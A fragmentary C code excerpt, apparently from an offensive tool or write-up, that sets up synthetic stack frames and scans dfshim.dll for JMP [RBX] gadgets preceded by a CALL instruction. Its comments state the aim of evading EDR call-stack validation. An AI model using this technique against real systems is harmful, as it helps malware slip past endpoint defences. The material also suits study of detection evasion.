...
void init_frame_info ( SYNTHETIC_STACK_FRAME * frame )
{
    ...
    /* use dfshim.dll for gadgets — it has JMP [RBX] gadgets with a
     * preceding call instruction, which passes EDR call stack validation */
...
PVOID find_gadget ( PVOID module )
{
    ...
    if ( !found_gadgets )
    {
        ...
        for ( int i = 5; i < ( text_section_size - 2 ); i++ )
        {
            /* x64 opcodes for JMP [RBX] are FF 23 */
            if ( ( ( PBYTE ) module_text_section ) [ i ]     == 0xFF &&
                 ( ( PBYTE ) module_text_section ) [ i + 1 ] == 0x23 )
            {
                /* validate a call instruction (E8) exists 5 bytes before
                 * the gadget — EDRs check for this to detect spoofed stacks */
